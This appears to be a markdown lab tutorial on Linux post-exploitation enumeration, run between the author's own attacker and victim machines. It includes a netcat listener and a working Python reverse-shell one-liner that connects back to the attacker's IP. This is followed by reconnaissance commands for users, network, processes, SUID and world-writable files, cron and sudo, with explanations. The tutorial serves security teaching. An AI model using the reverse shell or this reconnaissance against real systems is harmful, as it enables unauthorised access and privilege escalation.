<h1 align="center"> System Enumeration </h1>








## Scope:
- **Attacker**: Kali Linux Windows WSL (172.20.155.246)
- **Victim**: Kali Linux (192.168.127.128)



## What is System Enumeration?
System Enumeration is the process of gathering information about a target system to identify potential vulnerabilities and attack vectors for privilege escalation. It's the FIRST and MOST CRITICAL step after gaining initial access.





## Why Enumeration is Crucial?
- You can't exploit what you don't know exists
- Every system is unique - different configurations, different vulnerabilities
- Saves time by focusing on realistic attack paths


## Why is Enumeration Important?
- Thw first thing we should do once we obtain a reverse shell into a linux system is `Enumeration`.
- Enumeration is all about gathering meaningful infomaation regarding the system we're dealing with.
- A proper enumeration procedure will allow our to understand the specific configurations being deployed on the system, and, more inportantly, what are the vulnerable aspects of the system.
- Once we understand the vulnerabilities, we can then exploit them to elevate our privileges.




## The Enumeration Mindset
hink Like a Detective:
- What's here? (Files, users, services)
- What can I access? (Permissions, readable files)
- What's running? (Processes, services)
- What's misconfigured? (SUID, cron, sudo)
- What's vulnerable? (Old software, weak permissions)


## What to Enumerate?
In terms of what to enumerate, the following areas are key points to focus on:
• hardware architecture
• kernel version
• linux distribution + version
• users and groups ()
• access to powerful groups (e.g., , ...)
• sudo configuration ()
• filesystem directories (, , )
• SUID/SGID binaries
• local services
• network interfaces
• software installed with versions
• backups / saved sessions
• repositories under version control systems (, )
• cronjobs (discussed in a later video)
• capabilities (discussed in a later video)








# System Enumeration Methodology
- In this i used `TArget` is my `Ubuntu` and Attacker



## Systematic Enumeration
- On **attacker**:
````
nc -lvnp 4444
````
<img width="427" height="162" alt="image" src="https://github.com/user-attachments/assets/71a42bd3-efb5-4183-a55c-c2523104a748" />


- In this first the target run my `Reverse shell` on terminal:
````
python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.20.155.246",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
````
<img width="1876" height="138" alt="image" src="https://github.com/user-attachments/assets/cc7f23b5-7723-43ae-b873-64f9b95b8306" />

- Now we got target shell, after go back to attacker:
<img width="875" height="295" alt="image" src="https://github.com/user-attachments/assets/27f44ca7-87fa-4875-a5a0-e3b5d3fb3e92" />

- Now we got target shell.



### Initial Reconnaissance

#### Get basic system info:

- Current user:
````
whoami
````
<img width="382" height="204" alt="image" src="https://github.com/user-attachments/assets/49577e36-3a57-42b6-83c6-6a7c4f274546" />

- USer ID, Group, groups
````
id
````
<img width="1898" height="136" alt="image" src="https://github.com/user-attachments/assets/ff07cead-dd7d-4ec4-9c3a-ca740e811018" />

- System name:
````
hostname
````
<img width="349" height="116" alt="image" src="https://github.com/user-attachments/assets/6d062f6d-2932-4d86-8065-d94292482a1e" />


- Kernel version, architecture 
````
uname -a
````
<img width="1278" height="133" alt="image" src="https://github.com/user-attachments/assets/e9e3d264-798f-46f6-8725-8134e280d56c" />


- OS version:
````
cat /etc/issue
````
<img width="423" height="129" alt="image" src="https://github.com/user-attachments/assets/647ee1a1-6c8a-4f6e-8dcb-b1ec0df5664d" />

- `/etc/issue`: A text file in Linux that contains a short system identification message.

-  Detailed OS info
````
cat /etc/*-release
````
<img width="552" height="345" alt="image" src="https://github.com/user-attachments/assets/e09b6c16-f5e0-4552-ba61-279b7cc0fe79" />

- `/etc/*-release`: Matches any file in `/etc` ending with `-release`.
- Others:
  - `/etc/os-release`: Standard file with OS name, version, ID, and pretty name.
  - `/etc/lsb-release`: Sometimes present, gives Linux Standard Base info.
  - `/etc/redhat-release`, `/etc/debian_version`: Distro-specific release files


### User & Group Enumeration

#### Current user info
````
id
groups
````
<img width="1907" height="255" alt="image" src="https://github.com/user-attachments/assets/4023b423-9a70-4798-a65b-ca653d1776ae" />


#### All users:
````
cat /etc/passwd
````
<img width="970" height="957" alt="image" src="https://github.com/user-attachments/assets/fe3dbc29-5fc1-4e39-8999-232cfc11be9e" />

<img width="1213" height="732" alt="image" src="https://github.com/user-attachments/assets/6445b242-c236-4f79-aaa8-220ad610e32d" />


````
cut -d: -f1 /etc/passwd
````
<img width="492" height="1006" alt="image" src="https://github.com/user-attachments/assets/e02da3af-dfc5-4cd7-b47c-1b653f34c732" />

<img width="431" height="786" alt="image" src="https://github.com/user-attachments/assets/bb68f80f-d2c4-429e-a61d-795e8b7b2bf0" />

- `cut`: Extracts sections of each line in a file.
- `-d:`: Sets the delimiter to : (colon). The /etc/passwd file uses colons to separate fields.
- `-f1`: Selects the first field.
- `/etc/passwd`: The file that stores user account information (not passwords anymore, just metadata).
- this command is a staple in **privilege escalation** because it’s a fast way to fingerprint users before testing escalation paths.

````
getent passwd
````
<img width="1078" height="997" alt="image" src="https://github.com/user-attachments/assets/d5986ea7-e9f2-4881-a4d8-5bf8b3715912" />

<img width="1177" height="663" alt="image" src="https://github.com/user-attachments/assets/695ba192-f47a-4e05-8083-34a81903bef3" />

- `getent`:  A tool that queries system databases defined in the Name Service Switch (NSS).
- `passwd`: Refers to the user account database (same info you’d see in `/etc/passwd`).
- This command lists all user accounts on the system, but not just from the local `/etc/passwd` file — it also includes accounts from remote sources (like LDAP, NIS, or Active Directory) if your system is connected to them.




#### All groups
````
cat /etc/group
````
<img width="529" height="993" alt="image" src="https://github.com/user-attachments/assets/ba94a339-1670-4b9a-9bd1-ed42c81ab507" />

<img width="496" height="873" alt="image" src="https://github.com/user-attachments/assets/cd421c07-9e04-4ba7-a27a-f0a606276591" />

- `/etc/group` A text file that stores group account information on a Linux system.
-  This command is used to view all groups and their members on a Linux system, which is essential for managing permissions and security.



````
getent group
````
<img width="494" height="1001" alt="image" src="https://github.com/user-attachments/assets/fba5b589-93d8-4f04-9e18-9f226cc1b321" />

<img width="740" height="938" alt="image" src="https://github.com/user-attachments/assets/4a9afd18-dc05-416a-add9-c69804610520" />

- `getent`: Stands for get entries. It’s a Linux/Unix command used to fetch entries from system databases that are configured in the Name Service Switch (NSS).
- `group`: This specifies the database you want to query. In this case, the group database, which contains information about system groups.
- is used to list all groups recognized by the system (local + network sources), making it more flexible and reliable than just reading `/etc/group`.




#### Last logged in users
````
last
````
<img width="908" height="999" alt="image" src="https://github.com/user-attachments/assets/eace0f94-3bbe-4eb2-a70e-99cbea740902" />


#### Currently logged in
````
w
who
````
<img width="1919" height="321" alt="image" src="https://github.com/user-attachments/assets/44929577-f227-4cba-9f2f-60f9ed700b12" />


---


### Network Enumeration:

#### Netwrok interface
````
ifconfig
````
<img width="927" height="445" alt="image" src="https://github.com/user-attachments/assets/bc94d600-124d-47af-85ea-a40e9f6921b6" />

````
ip addr show
````
<img width="1126" height="342" alt="image" src="https://github.com/user-attachments/assets/d706037b-7975-4e51-9029-eab7b38eccbd" />

````
ip route show
````
<img width="916" height="136" alt="image" src="https://github.com/user-attachments/assets/ed45ff82-5552-44d8-9010-deb3a4fc56aa" />


#### Active connections
````
netstat -antup
ss -tunlp
````
<img width="1100" height="341" alt="image" src="https://github.com/user-attachments/assets/0050f1ab-a450-4c94-8ba7-fd4dfd941b8f" />


#### ARP table:
````
arp -a
ip neigh show
````
<img width="701" height="241" alt="image" src="https://github.com/user-attachments/assets/10984305-917f-463b-9c41-a2e0764509bf" />



#### DNS
````
cat /etc/resolv.conf
cat /etc/hosts
````
<img width="756" height="414" alt="image" src="https://github.com/user-attachments/assets/eb95f0bf-8c2e-4b8b-b80d-4bbeb8ea4581" />




### Process Enumeration

#### All process
````
ps aux
````
<img width="1018" height="1017" alt="image" src="https://github.com/user-attachments/assets/6383f866-e497-4aa4-989a-e7a3af34565e" />

````
ps -ef
````
<img width="1088" height="1006" alt="image" src="https://github.com/user-attachments/assets/7dbb3766-b8c3-4a8d-9731-3357c2be9cc5" />



#### Process tree
````
pstree
````
<img width="1436" height="1004" alt="image" src="https://github.com/user-attachments/assets/08d63ec9-603d-4bb9-a9be-f1cd68bbd49a" />


#### Process with network connections
````
lsof -i
````
<img width="1198" height="215" alt="image" src="https://github.com/user-attachments/assets/6d755bdb-2f8b-444f-8b76-6b3e0e42baa0" />




#### Check for interesting process:
````
ps aux | grep -E "(root|admin|backup|cron)"
````
<img width="1277" height="975" alt="image" src="https://github.com/user-attachments/assets/34efb346-289e-40d5-8361-4458c16b561b" />

<img width="1922" height="1008" alt="image" src="https://github.com/user-attachments/assets/531922fb-55a3-41b6-8367-b7cb7050d72f" />

- `ps`: Stands for process status. It shows running processes on the system.
- `aux`: These are options for ps:
  - `a`: Show processes for all users (not just the current one).
  - `u`: Display user-oriented format (shows the user who owns the process).
  - `x`: Include processes not attached to a terminal (like daemons).
- `| **(pipe)**`: Sends the output of `ps aux` into the next command (`grep`).
- `grep -E`: Searches text using extended regular expressions.
- `"(root|admin|backup|cron)"` → The regex pattern. It matches any line containing root, admin, backup, or cron.
- This command is used to filter running processes for specific critical users or services (root, admin, backup, cron). It’s a quick way to spot important or suspicious activity.




### File System Enumeration

#### Check disk usage
````
df -h
lsblk
````
<img width="903" height="975" alt="image" src="https://github.com/user-attachments/assets/e86d92f3-1506-44e1-bf28-2cb472d7a520" />


#### Find interesting directories
````
ls -la /home/
ls -la /opt/
ls -la /var/www/
ls -la /tmp/
ls -la /dev/shm/
````
<img width="653" height="571" alt="image" src="https://github.com/user-attachments/assets/630b39fd-218a-4ae8-aa8b-f044002cc0d2" />

<img width="1419" height="602" alt="image" src="https://github.com/user-attachments/assets/7119c525-93d4-43eb-a15b-9f7dfc11b3c8" />



#### Find SUID files
````
find / -type f -perm -4000 2>/dev/null
````
<img width="699" height="1000" alt="image" src="https://github.com/user-attachments/assets/3ccb838b-2b43-4d57-80c3-64919ca69b3d" />

<img width="773" height="520" alt="image" src="https://github.com/user-attachments/assets/610c0df7-b25b-490d-9449-7720a7697314" />

- `find /`: Start searching from the root directory (`/`), meaning the entire filesystem.
- `-type f`: Restrict the search to files (not directories, links, etc.).
- `-perm -4000`: Match files with the SUID bit set:
  - `4000` is the octal permission for the SUID (Set User ID) bit.
  - SUID means when the file is executed, it runs with the privileges of the file’s owner (often root).
- `2>/dev/null`: Redirect error messages (like "Permission denied") to /dev/null (a black hole), so only valid results are shown.
- This command is used to find all SUID files on the system, which is critical for both attackers (privilege escalation) and defenders (hardening and auditing).



#### Find SGID files
````
find / -type f -perm -2000 2>/dev/null
````
<img width="715" height="474" alt="image" src="https://github.com/user-attachments/assets/ddf7fa47-a470-49cd-b0d6-2bff9dde21d9" />

- `-perm -2000`: Match files with the SGID (Set Group ID) bit set:
  - `2000` is the octal permission for SGID.
  - SGID means when the file is executed, it runs with the privileges of the file’s group owner.
- This command is used to find all SGID files on the system, which is critical for both attackers (group privilege escalation) and defenders (auditing and hardening).



#### Find world-writable files
````
find / -type f -perm -0002 2>/dev/null
````
<img width="451" height="786" alt="image" src="https://github.com/user-attachments/assets/196734a8-3d4f-4a98-b5f9-4a502d84a16c" />

- `-perm -0002`: Match files with the world-writable bit set:
  - `0002` is the octal permission for "others can write".
  - World-writable means any user on the system can modify the file
- This command lists all files on the system that anyone can write to, regardless of ownership.
- This command is used to find all files that anyone can write to, which is crucial for spotting misconfigurations and potential privilege escalation paths



#### Find world-writeable files
````
find / -type f -perm -0004 2>/dev/null
````
<img width="658" height="707" alt="image" src="https://github.com/user-attachments/assets/aeee760b-79da-468d-b0c9-994fe628ffe5" />

- `-perm -0004`: Match files with the world-readable bit set:
  - `0004` is the octal permission for "others can read".
  - World-readable means any user on the system can read the file’s contents
- This command is used to find all files that anyone can read, which is critical for spotting misconfigurations and potential information disclosure risks



#### Find files owned by current user
````
find / -user $(whoami) 2>/dev/null
````
<img width="881" height="754" alt="image" src="https://github.com/user-attachments/assets/d3d8bab4-6b76-4051-a847-696fab92bb7d" />

- `-user $(whoami)`: Restrict results to files owned by the user returned by whoami.
  - `whoami`: Prints the current logged-in username.
  - `$(whoami)`: Command substitution; replaces `$(whoami)` with your actual username.
- This command is used to find all files owned by the current user across the system, which is useful for both auditing and privilege escalation reconnaissance.


#### Find files owned by root but writable by us
````
find / -type f -user root -perm -o=w 2>/dev/null
````
<img width="615" height="753" alt="image" src="https://github.com/user-attachments/assets/6d72516f-97b3-4dd8-9cc0-e24fd8ef8a22" />

- `-user root`: Only return files owned by the root user.
- `-perm -o=w`: Match files that are world‑writable (o=w means "others have write permission").
- This command is used to find root‑owned files that anyone can write to, which is one of the most critical checks in privilege escalation and system hardening.




### Service & Configuration Enumeration

#### Running services
````
systemctl list-units --type=service --state=running
````
<img width="974" height="587" alt="image" src="https://github.com/user-attachments/assets/36fc4653-cfe5-4aba-9694-96035ec56728" />

- To exit this press `q` -> `Enter`.

````
service --status-all
````

<img width="504" height="950" alt="image" src="https://github.com/user-attachments/assets/3b52290e-d683-4f5e-bc6a-d76f1504b58b" />



#### Cron jobs
````
ls -la /etc/cron*
````
<img width="673" height="1029" alt="image" src="https://github.com/user-attachments/assets/239616e4-9d0b-42f9-a6d7-c52833ba6044" />

````
cat /etc/crontab
````
<img width="1067" height="491" alt="image" src="https://github.com/user-attachments/assets/70c7faba-5ecc-48fb-ad9b-79abf3d7d4f2" />

````
ls -la /var/spool/cron/
crontab -l
````
<img width="598" height="245" alt="image" src="https://github.com/user-attachments/assets/3101d558-700f-40ae-a59a-9f23e3c6d525" />

<img width="306" height="96" alt="image" src="https://github.com/user-attachments/assets/f7b943a6-022c-4ac2-b939-2b59132d76dd" />


#### Sudo privileges
````
sudo -l
````
<img width="879" height="242" alt="image" src="https://github.com/user-attachments/assets/818e7517-1455-483e-a843-8ce471bba30a" />

----






































































